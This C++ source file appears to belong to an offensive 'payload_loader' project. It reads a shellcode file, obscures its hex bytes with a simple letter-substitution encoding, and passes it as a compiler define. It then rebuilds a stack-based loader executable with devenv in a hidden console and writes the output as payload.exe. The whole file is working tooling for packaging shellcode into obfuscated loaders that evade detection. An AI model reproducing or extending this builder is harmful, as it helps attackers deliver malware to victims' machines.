#include <windows.h>
#include <string>
#include <fstream>
#include <regex>
#include<cstdio>
#include <direct.h> 
#include <io.h> 
#include "../Common/CmdlineParser.hpp"
#include "../Common/Tools.hpp"

#pragma warning(disable:4996)
using namespace std;

void encode(string& content);

string ProjectDir = "C:\\github\\Attack\\payload_loader\\";

int main()
{
	AttachConsole(ATTACH_PARENT_PROCESS);
	freopen("CONIN$", "r+t", stdin); // 重定向 STDIN 
	freopen("CONOUT$", "w+t", stdout); // 重定向STDOUT

	LPSTR lpcmdline = GetCommandLineA();
	string strCmdLine = (lpcmdline == nullptr ? "" : lpcmdline);
	CmdlineParser cmdLine(strCmdLine);

	if (!cmdLine.hasParam("f"))
	{
		return TRUE;
	}

	bool x86 = true;
	if (cmdLine.hasParam("x64") && cmdLine["x64"].toInt() == 1)
		x86 = false;

	string content = ReadFileIntoString(cmdLine["f"].toString());

	if (content == "") {
		printf("read payload file error\n");
		return 0;
	}

	char pBuf[MAX_PATH];
	GetCurrentDirectoryA(MAX_PATH, pBuf);
	string fileName = "payload.exe", filePath = string(pBuf)+"\\";
	if (cmdLine.hasParam("out")) {
		string out = cmdLine["out"].toString();

		string::size_type iPos = out.find_last_of('\\') + 1;
		if (iPos != 0) {
			fileName = out.substr(iPos, out.length() - iPos);
			filePath = out.substr(0, iPos);
		}
		else {
			fileName = out;
		}
		if (!IsValidFileName(fileName))
		{
			printf("filename is invalid\n");
			return 0;
		}

		if (CreateFullDirectory(filePath) != 0) {
			printf("Folder creation failed\n");
			return 0;
		}

		if (!CanAccessFile(filePath, GENERIC_WRITE)) //判断是否有可写权限
		{
			printf("filePath does not have writable permission\n");
			return 0;
		}

		if (fileName == "") {
			fileName = "payload.exe";
		}
	}

	encode(content);

	char* str = (char*)malloc(content.length()+0x50);
	memset(str, 0, content.length() + 0x50);
	sprintf(str, "CL=/DSHELLCODE#\\\"%s\\\"", content.c_str());
	putenv(str);
	
	string cmdStr = "/c devenv.com "+ ProjectDir + "Loader.sln /Rebuild \"Release|X64\" /Project Stack";
	string outPath = ProjectDir + "x64\\Release\\Stack64.exe";
	
	if (x86) {
		cmdStr = "/c devenv.com " + ProjectDir + "Loader.sln /Rebuild \"Release|X86\" /Project Stack";
		outPath = ProjectDir + "Release\\Stack32.exe";
	}

	cmdStr += "&&move /y " + outPath + " " + (filePath + fileName);
	ShellExecuteA(NULL, "open", "cmd", cmdStr.c_str(), NULL, SW_HIDE);

	return 0;
}

void encode(string& content)
{
	map<string, string>str;
	str["0"] = "q";
	str["1"] = "w";
	str["2"] = "e";
	str["3"] = "r";
	str["4"] = "t";
	str["5"] = "y";
	str["6"] = "u";
	str["7"] = "o";
	str["8"] = "p";
	str["9"] = "a";
	str["a"] = "s";
	str["b"] = "d";
	str["c"] = "f";
	str["d"] = "g";
	str["e"] = "h";
	str["f"] = "j";

	content = Subreplace(content, "\\x", "");

	int length = content.length();
	for (int i = 0; i < length; i++)
	{
		content.replace(i, 1, str[content.substr(i, 1)]);
	}
}